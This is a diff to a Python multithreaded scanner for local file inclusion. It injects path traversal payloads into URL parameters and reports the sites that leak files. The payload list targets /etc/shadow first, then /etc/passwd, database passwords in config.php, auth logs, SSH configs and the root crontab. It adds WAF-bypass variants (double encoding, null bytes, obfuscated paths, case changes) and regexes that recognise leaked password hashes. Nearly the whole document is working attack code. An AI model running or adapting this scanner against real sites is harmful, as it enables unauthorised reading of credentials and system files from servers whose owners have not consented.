@@ -6,14 +6,15 @@ import logging
 import re
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from tqdm import tqdm
 from colorama import init, Fore, Style
 
-# Initialize colorama
+# Initialize colorama for colored console output
 init(autoreset=True)
 
 # Disable SSL warnings to prevent console clutter when scanning HTTPS URLs with self-signed certificates
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings(
+    requests.packages.urllib3.exceptions.InsecureRequestWarning
+)
 
 # Setup logging to capture detailed scan information and errors
 logging.basicConfig(
@@ -22,91 +23,103 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
-# Hardcoded payloads for LFI testing
-PAYLOADS = [
-    # Standard payloads
-    "../../../../../../../../../../../../etc/passwd",
-    "../../../../../../../../../../../../etc/hosts",
-    "../../../../../../../../../../../../var/log/apache2/access.log",
-    "../../../../../../../../../../../../var/www/html/config.php",
-    "../../../../../../../../../../../../proc/self/environ",
-    "../../../../../../../../../../../../windows/win.ini",
-    "../../../../../../../../../../../../boot.ini",
-    "../../../../../../../../../../../../../../../../../../../../etc/shadow",
-    
+# Define payloads along with their associated keyword regex patterns
+# Reordered to prioritize /etc/shadow payloads before others like /etc/passwd
+PAYLOAD_KEYWORDS = [
+    # /etc/shadow payloads
+    ("../../../../../../../../../../../../etc/shadow", [
+        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
+        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
+        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
+    ]),
+    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow", [
+        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
+        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
+        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
+    ]),
+    ("..../..//..../..//..../..//..//etc/shadow", [
+        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
+        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
+        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
+    ]),
+
+    # /etc/passwd payloads
+    ("../../../../../../../../../../../../etc/passwd", [r"root:x"]),
+    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", [r"root:x"]),
+    ("../../../../../../../../../../../../etc/passwd%00", [r"root:x"]),
+    ("..../..//..../..//..../..//..//etc/passwd", [r"root:x"]),
+    ("../../../../../../../../../../../../eTc/PaSsWd", [r"root:x"]),
+    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", [r"root:x"]),
+
+    # /etc/hosts payloads
+    ("../../../../../../../../../../../../etc/hosts", [r"127\.0\.0\.1"]),
+    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts", [r"127\.0\.0\.1"]),
+    ("../../../../../../../../../../../../etc/hosts%00", [r"127\.0\.0\.1"]),
+    ("..../..//..../..//..../..//..//etc/hosts", [r"127\.0\.0\.1"]),
+    ("../../../../../../../../../../../../Etc/HoStS", [r"127\.0\.0\.1"]),
+
+    # Other standard payloads
+    ("../../../../../../../../../../../../var/log/apache2/access.log", [r"GET"]),
+    ("../../../../../../../../../../../../var/log/apache2/access.log%00", [r"GET"]),
+    ("../../../../../../../../../../../../var/log/apache2/access.log", [r"GET"]),
+    ("../../../../../../../../../../../../var/log/nginx/access.log", [r"GET"]),
+    ("../../../../../../../../../../../../var/log/nginx/error.log", [r"error"]),
+    ("../../../../../../../../../../../../var/log/auth.log", [r"Accepted"]),
+    ("../../../../../../../../../../../../etc/ssh/sshd_config", [r"sshd", r"Port \d+"]),
+    ("../../../../../../../../../../../../etc/apache2/apache2.conf", [r"User", r"Group"]),
+    ("../../../../../../../../../../../../etc/nginx/nginx.conf", [r"worker_connections", r"events"]),
+    ("../../../../../../../../../../../../var/spool/cron/crontabs/root", [r"MAILTO="]),
+
     # WAF bypass techniques
     # Double URL encoding
-    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",  # /etc/passwd (double-encoded)
-    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",  # /etc/shadow (double-encoded)
-    
+    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", [r"root:x"]),
+    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow", [
+        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
+        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
+        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
+    ]),
+
     # Null byte injection
-    "../../../../../../../../../../../../etc/passwd%00",    # /etc/passwd with null byte
-    "../../../../../../../../../../../../var/www/html/config.php%00",  # /var/www/html/config.php with null byte
-    
+    ("../../../../../../../../../../../../var/www/html/config.php%00", [r"(<\?php){2,}", r"DB_PASSWORD"]),
+
     # Path obfuscation
-    "..../..//..../..//..../..//..../..//etc/passwd",  # Path traversal with truncation
-    "..../..//..../..//..../..//..../..//etc/shadow",  # Path traversal with truncation
-    
+    ("..../..//..../..//..../..//..//etc/passwd", [r"root:x"]),
+    ("..../..//..../..//..../..//..//etc/shadow", [
+        r"^\w+:\$[0-9]+\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+:",
+        r"^\w+:[\*\!]:\d+:\d+:\d+:\d+:\d*:\d*:\d*$",
+        r"^\w+:[\$\*\!][^:]*:\d+:\d+:\d+:\d+:\d*:\d*:\d*$"
+    ]),
+
     # Case variation
-    "../../../../../../../../../../../../eTc/PaSsWd",        # /etc/passwd (case variation)
-    "../../../../../../../../../../../../Etc/HoStS",         # /etc/hosts (case variation)
-    
+    ("../../../../../../../../../../../../eTc/PaSsWd", [r"root:x"]),
+    ("../../../../../../../../../../../../Etc/HoStS", [r"127\.0\.0\.1"]),
+
     # Hexadecimal encoding (ASCII to hex for '/etc/passwd')
-    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",  # /etc/passwd (hex-encoded)
-    
+    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", [r"root:x"]),
+
     # NGINX/Apache log files
-    "../../../../../../../../../../../../var/log/nginx/access.log",
-    "../../../../../../../../../../../../var/log/nginx/error.log",
-    
+    ("../../../../../../../../../../../../var/log/nginx/access.log", [r"GET"]),
+    ("../../../../../../../../../../../../var/log/nginx/error.log", [r"error"]),
+
     # Security logs and SSH config
-    "../../../../../../../../../../../../var/log/auth.log",
-    "../../../../../../../../../../../../etc/ssh/sshd_config",
-    
+    ("../../../../../../../../../../../../var/log/auth.log", [r"Accepted"]),
+    ("../../../../../../../../../../../../etc/ssh/sshd_config", [r"sshd", r"Port \d+"]),
+
     # Apache2 config
-    "../../../../../../../../../../../../etc/apache2/apache2.conf",
-    "../../../../../../../../../../../../etc/nginx/nginx.conf",
-    
+    ("../../../../../../../../../../../../etc/apache2/apache2.conf", [r"User", r"Group"]),
+    ("../../../../../../../../../../../../etc/nginx/nginx.conf", [r"worker_connections", r"events"]),
+
     # Root crontab
-    "../../../../../../../../../../../../var/spool/cron/crontabs/root",
+    ("../../../../../../../../../../../../var/spool/cron/crontabs/root", [r"MAILTO="]),
 ]
 
-
-# Corresponding regex patterns for each payload to identify successful LFI
-# Using raw strings (r'') to ensure backslashes are handled correctly
-KEYWORDS = [
-    r"root:x",                                     # /etc/passwd
-    r"127\.0\.0\.1",                               # /etc/hosts
-    r"GET",                                        # Apache access log
-    r"(<\?php){2,}",                               # config.php (multiple "<?php")
-    r"HTTP_USER_AGENT",                            # /proc/self/environ
-    r"\[fonts\]",                                  # windows/win.ini
-    r"Windows",                                    # boot.ini
-    r"root:\*:\d+:\d+:",                           # /etc/shadow (e.g., root:*:0:0)
-    r"Ubuntu",                                     # /etc/issue
-    r"PATH=",                                      # /etc/profile
-    r"ubuntu",                                     # /etc/hostname
-    r"Welcome",                                    # /etc/motd
-    r"tcp",                                        # /etc/services
-    r"root:x:",                                    # /etc/group
-    r"nameserver",                                 # /etc/resolv.conf
-    r"/usr/local/bin",                             # /etc/rc.local
-    r"net\.ipv4",                                  # /etc/sysctl.conf
-    r"/dev/sda",                                   # /etc/fstab
-    r"\*:\*:\*:\*:\*:",                             # /etc/crontab
-    r"soft nofile",                                # /etc/security/limits.conf
-    r"APP_ENV",                                    # .env
-    r"DB_PASSWORD",                                # wp-config.php
-    r"RewriteEngine",                              # .htaccess
-    r"\[core\]",                                   # .git/config
-    r"<!DOCTYPE html>",                            # index.html
-    r"MAILTO=",                                    # Root crontab
-    r"Accepted",                                   # Linux auth log
-    r"sshd",                                       # SSH config
-    r"Port \d+",                                   # SSH config (e.g., Port 22)
-    r"User",                                       # Apache2 config (Apache user directive)
-    r"worker_connections",                         # NGINX config (worker_connections directive)
-]
-
+# Pre-compile all regex patterns with re.IGNORECASE and re.MULTILINE for performance and multiline matching
+for i, (payload, patterns) in enumerate(PAYLOAD_KEYWORDS):
+    try:
+        PAYLOAD_KEYWORDS[i] = (payload, [re.compile(pattern, re.IGNORECASE | re.MULTILINE) for pattern in patterns])
+    except re.error as e:
+        logging.error(f"Regex compilation error for payload '{payload}': {e}")
+        PAYLOAD_KEYWORDS[i] = (payload, [])
 
 def read_urls(file_path):
     """
@@ -155,62 +168,62 @@ def send_request(url):
         logging.error(f"Request failed for URL {url}: {e}")
         return None
 
-def analyze_response(response, keyword_pattern):
+def analyze_response(response, compiled_patterns):
     """
-    Analyze the HTTP response for the presence of the keyword using regex.
-    Returns True if the pattern matches, False otherwise.
+    Analyze the HTTP response for the presence of any of the keyword patterns using pre-compiled regex.
+    Returns True if any pattern matches, False otherwise.
     """
     if response and response.status_code == 200:
-        try:
-            if re.search(keyword_pattern, response.text, re.IGNORECASE):
-                logging.debug(f"Keyword pattern '{keyword_pattern}' matched.")
-                return True
-        except re.error as regex_error:
-            logging.error(f"Invalid regex pattern: {keyword_pattern} | Error: {regex_error}")
+        for pattern in compiled_patterns:
+            try:
+                if pattern.search(response.text):
+                    logging.debug(f"Keyword pattern '{pattern.pattern}' matched.")
+                    return True
+            except re.error as regex_error:
+                logging.error(f"Invalid regex pattern: {pattern.pattern} | Error: {regex_error}")
     return False
 
-def process_url(url, progress_bar):
+def process_url(url):
     """
-    Process a single URL by injecting payloads into its parameters and analyzing responses.
-    Returns a list of tuples with vulnerable URLs and the payload that triggered the vulnerability.
+    Process a single URL by injecting payloads into its parameters one at a time and analyzing responses.
+    Returns a list of tuples with vulnerable URLs, parameter, and the payload that triggered the vulnerability.
     """
     vulnerable = []
     base_url, params = identify_parameters(url)
     
     if not params:
         logging.info(f"No parameters found in URL: {url}")
-        progress_bar.update(1)
         return vulnerable
     
-    for idx, payload in enumerate(PAYLOADS):
-        # Ensure we have a corresponding keyword
-        if idx >= len(KEYWORDS):
-            logging.warning(f"No keyword defined for payload: {payload}. Skipping.")
-            continue
-        keyword_pattern = KEYWORDS[idx]
+    for param in params:
         injected_params = params.copy()
+        payload_success = False  # Flag to indicate if a payload succeeded for this parameter
+        for payload, keyword_patterns in PAYLOAD_KEYWORDS:
+            if not keyword_patterns:
+                continue  # Skip if no valid regex patterns
+            # Inject payload into the current parameter only
+            injected_params[param] = payload
+            injected_url = construct_url(base_url, injected_params)
+            logging.info(f"Testing payload: {payload} on URL: {injected_url} (Parameter: {param})")
+            response = send_request(injected_url)
+            
+            if analyze_response(response, keyword_patterns):
+                logging.info(f"VULNERABLE: {injected_url} | Parameter: {param} | Payload: {payload}")
+                print(f"{Fore.GREEN}[+] Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}{Style.RESET_ALL}")
+                vulnerable.append((injected_url, param, payload))
+                payload_success = True
+                break  # Stop trying other payloads for this parameter
+            else:
+                print(f"{Fore.RED}[-] Not Vulnerable: {injected_url} | Parameter: {param} | Payload: {payload}{Style.RESET_ALL}")
         
-        # Inject payload into each parameter
-        for key in injected_params:
-            injected_params[key] = payload
-        
-        injected_url = construct_url(base_url, injected_params)
-        logging.info(f"Testing payload: {payload} on URL: {injected_url}")
-        response = send_request(injected_url)
-        
-        if analyze_response(response, keyword_pattern):
-            logging.info(f"VULNERABLE: {injected_url} | Payload: {payload}")
-            vulnerable.append((injected_url, payload))
-            print(f"{Fore.GREEN}[+] Vulnerable: {injected_url} | Payload: {payload}{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.RED}[-] Not Vulnerable: {injected_url} | Payload: {payload}{Style.RESET_ALL}")
-        
-    progress_bar.update(1)
+        if payload_success:
+            continue  # Move to the next parameter after a successful payload
+    
     return vulnerable
 
 def main():
     # Argument parsing
-    parser = argparse.ArgumentParser(description='Automated LFI Scanner with Regex Matching, Progress Bar, and Colored Output')
+    parser = argparse.ArgumentParser(description='Automated LFI Scanner with Enhanced Detection and Output')
     parser.add_argument('-i', '--input', required=True, help='Input file with URLs (one per line)')
     parser.add_argument('-o', '--output', required=True, help='Output file for vulnerable URLs')
     parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
@@ -231,28 +244,25 @@ def main():
         print(f"Failed to open output file {args.output}. Check log for details.")
         return
     
-    # Initialize progress bar
-    progress_bar = tqdm(total=len(urls), desc="Scanning URLs", unit="URL")
-    
     # Start scanning with ThreadPoolExecutor
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
         # Submit all URLs to the executor
-        futures = [executor.submit(process_url, url, progress_bar) for url in urls]
+        futures = {executor.submit(process_url, url): url for url in urls}
         
         for future in as_completed(futures):
+            url = futures[future]
             try:
                 vulnerable = future.result()
                 if vulnerable:
-                    for vuln_url, payload in vulnerable:
-                        output_file.write(f"{vuln_url} | Payload: {payload}\n")
+                    for vuln_url, param, payload in vulnerable:
+                        output_file.write(f"{vuln_url} | Parameter: {param} | Payload: {payload}\n")
             except Exception as e:
-                logging.error(f"Error processing a URL: {e}")
-                print(f"{Fore.RED}Error processing a URL. Check log for details.{Style.RESET_ALL}")
+                logging.error(f"Error processing URL {url}: {e}")
+                print(f"{Fore.RED}Error processing URL {url}. Check log for details.{Style.RESET_ALL}")
     
-    progress_bar.close()
     output_file.close()
     print(f"\nScan complete. Results saved to {args.output}")
     logging.info("Scanning completed.")
 
 if __name__ == "__main__":
-        main()
+    main()
